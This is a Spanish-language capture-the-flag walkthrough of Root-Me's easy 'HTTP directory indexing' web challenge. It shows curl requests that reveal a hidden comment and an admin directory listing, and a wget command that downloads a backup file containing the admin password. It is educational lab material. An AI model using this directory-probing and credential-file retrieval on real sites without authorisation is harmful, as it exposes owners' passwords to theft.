

**CTF:** [http index]
**Categoría:** [Web]
**Dificultad:** [Fácil]
**Fecha:** [2025-12-29]

## 🎯 Descripción y Objetivo
se nos da una pagiga vacia pero por el nombre del reto nos podemos dar una idea
de como explotarla
## 🔍 Reconocimiento y Análisis

podemos empezar revisando el codigo base de la pagina vacia
para ver si eso nos da alguna informacion
```
bash
curl http://challenge01.root-me.org/web-serveur/ch4/ -L
<html>
<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
<!-- include("admin/pass.html") -->

</body>
</html>
```
efevtivamente nos da una ruta ,procedemos a buscar dentro de ella ese archvio pass.html

```
bash

curl http://challenge01.root-me.org/web-serveur/ch4/admin/pass.html -L
<html>
  <head>
    <title>HTTP directory indexing</title>
  </head>
 <body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
    <center>
      <br/><br/>
      J'ai bien l'impression que tu t'es fait avoir / Got rick rolled ? ;)<br/>
      T'inqui&egrave;te tu n'es pas le dernier / You're not the last  :p<br/><br/>
      Cherche BIEN / Just search<br/><br/>
    </center>
  </body>
</html>```

resulta que esto es solo una mala broma del desarrollador,pero podemos buscar dentro de la carpeta
admin, si ejecutamos el comando de curl nos daremos de cuenta que hay un directorio backup
con un archivo con la contraseña dentro


```
wget http://challenge01.root-me.org/web-serveur/ch4/admin/backup/admin.txt
```

con esto obtendriamos la contraseña para validar el reto :D
